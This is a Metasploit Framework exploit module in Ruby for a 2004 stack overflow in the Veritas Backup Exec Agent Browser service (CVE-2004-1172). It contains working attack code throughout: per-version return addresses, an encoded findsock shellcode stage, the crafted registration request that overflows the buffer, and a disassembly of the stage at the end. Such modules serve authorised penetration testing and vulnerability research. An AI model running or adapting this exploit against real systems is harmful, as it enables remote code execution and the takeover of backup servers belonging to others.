##
# $Id: name_service.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Veritas Backup Exec Name Service Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in the Veritas Backup
				Exec Agent Browser service. This vulnerability occurs when a
				recv() call has a length value too long for the	destination
				stack buffer. By sending an agent name value of 63 bytes or
				more, we can overwrite the return address of the recv
				function. Since we only have ~60 bytes of contiguous space
				for shellcode, a tiny findsock payload is sent which uses a
				hardcoded IAT address for the recv() function. This payload
				will then roll the stack back to the beginning of the page,
				recv() the real shellcode into it, and jump to it. This
				module has been tested against Veritas 9.1 SP0, 9.1 SP1, and
				8.6.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2004-1172'],
					[ 'OSVDB', '12418'],
					[ 'BID', '11974'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=169&type=vulnerabilities'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'MinNops'  => 512,
					'MinNops'  => 512,
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'Veritas BE 9.1 SP0/SP1', # BackupExec 9.1 SP0/SP1 return contributed by class101
						{
							'Platform' => 'win',
							'Rets'     => [ 0x0142ffa1, 0x401150FF ], # recv@bnetns.exe v9.1.4691.0 | esi@bnetns.exe
						},
					],
					[
						'Veritas BE 8.5',
						{
							'Platform' => 'win',
							'Rets'     => [ 0x014308b9, 0x401138FF ], # recv@bnetns.exe v8.50.3572 | esi@beclass.dll v8.50.3572
						},
					],
				],
			'DisclosureDate' => 'Dec 16 2004',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(6101)
			], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		# This will findsock/read the real shellcode (51 bytes, harcoded IAT for recv)
		# The IAT for recv() is for bnetns, the address is shifted by 8 bits to avoid
		# nulls: [0x00401150 -> 0x401150FF]
		stage_code = "\xfc" * 112
		stage_read =
			"\x31\xf6\xc1\xec\x0c\xc1\xe4\x0c\x89\xe7\x89\xfb\x6a\x01\x8b\x74"+
			"\x24\xfe\x31\xd2\x52\x42\xc1\xe2\x10\x52\x57\x56\xb8\xff\x50\x11"+
			"\x40\xc1\xe8\x08\xff\x10\x85\xc0\x79\x07\x89\xdc\x4e\x85\xf6\x75"

		# Configure the IAT for the recv call
		stage_read[29, 4] = [ target['Rets'][1] ].pack('V')

		# Stuff it all into one request
		stage_code[2, stage_read.length] = stage_read

		# Create the registration request
		req =
			"\x02\x00\x32\x00\x20\x00" + stage_code + "\x00"+
			"1.1.1.1.1.1\x00" + "\xeb\x81"

		print_status("Sending the agent registration request of #{req.length} bytes...")
		sock.put(req)

		print_status("Sending the payload stage down the socket...")
		sock.put(payload.encoded)

		print_status("Waiting for the payload to execute...")
		select(nil,nil,nil,2)

		handler
		disconnect
	end

end


__END__
[ findsock stage ]
00000000  31F6              xor esi,esi
00000002  C1EC0C            shr esp,0xc
00000005  C1E40C            shl esp,0xc
00000008  89E7              mov edi,esp
0000000A  89FB              mov ebx,edi
0000000C  6A01              push byte +0x1
0000000E  8B7424FE          mov esi,[esp-0x2]
00000012  31D2              xor edx,edx
00000014  52                push edx
00000015  42                inc edx
00000016  C1E210            shl edx,0x10
00000019  52                push edx
0000001A  57                push edi
0000001B  56                push esi
0000001C  B8FF501140        mov eax,0x401150ff
00000021  C1E808            shr eax,0x8
00000024  FF10              call near [eax]
00000026  85C0              test eax,eax
00000028  7907              jns 0x31
0000002A  89DC              mov esp,ebx
0000002C  4E                dec esi
0000002D  85F6              test esi,esi
0000002F  75E1              jnz 0x12
00000031  FFD7              call edi